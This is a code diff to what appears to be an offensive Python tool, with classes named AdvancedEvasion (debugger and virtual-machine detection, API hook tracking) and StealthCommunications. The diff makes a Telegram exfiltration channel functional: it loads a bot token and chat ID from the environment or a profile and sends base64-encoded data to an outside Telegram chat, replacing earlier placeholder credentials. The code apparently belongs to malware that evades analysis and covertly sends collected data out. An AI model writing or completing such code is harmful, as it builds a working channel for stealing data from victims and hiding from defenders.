@@ -36,6 +36,11 @@ class AdvancedEvasion:
         self.debugger_detected = False
         self.vm_detected = False
         self.hooked_apis = set()
+        notifications = self.profile.get('notifications', {})
+        telegram_cfg = notifications.get('telegram', {})
+        self.telegram_enabled = telegram_cfg.get('enabled', False)
+        self.telegram_token = os.environ.get('TELEGRAM_BOT_TOKEN') or telegram_cfg.get('bot_token')
+        self.telegram_chat_id = os.environ.get('TELEGRAM_CHAT_ID') or telegram_cfg.get('chat_id')
         
         # Load evasion techniques based on level
         self._load_techniques()
@@ -975,19 +980,22 @@ class StealthCommunications:
         return None
     
     def _send_telegram(self, data):
-        """Send data via Telegram bot"""
+        """Send data via Telegram bot using configured credentials."""
         try:
-            import telebot  # Requires python-telegram-bot
-            
-            bot_token = "YOUR_BOT_TOKEN"
-            chat_id = "YOUR_CHAT_ID"
-            
+            import telebot  # Provided by pyTelegramBotAPI
+
+            bot_token = self.telegram_token
+            chat_id = self.telegram_chat_id
+
+            if not self.telegram_enabled or not bot_token or not chat_id:
+                return None
+
             bot = telebot.TeleBot(bot_token)
             encoded = base64.b64encode(json.dumps(data).encode()).decode()
             bot.send_message(chat_id, encoded[:4000])  # Telegram limit
-            
+
             return {'status': 'sent'}
-        except:
+        except Exception:
             return None
     
     def _get_random_user_agent(self):
